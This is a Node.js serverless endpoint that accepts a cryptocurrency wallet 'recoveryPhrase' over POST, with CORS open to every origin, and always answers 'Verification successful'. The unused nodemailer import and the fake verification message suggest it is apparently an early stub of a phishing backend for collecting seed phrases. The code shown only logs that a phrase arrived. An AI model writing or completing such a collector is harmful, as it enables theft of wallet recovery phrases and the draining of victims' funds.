const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  
  // Handle pre-flight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { recoveryPhrase } = req.body;
    
    console.log('API called successfully');
    console.log('Data received:', recoveryPhrase ? 'Phrase received' : 'No phrase');

    // For testing purposes, return success
    return res.status(200).json({ 
      success: true, 
      message: 'Verification successful' 
    });
  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Server error occurred: ' + (error.message || 'Unknown error')
    });
  }
};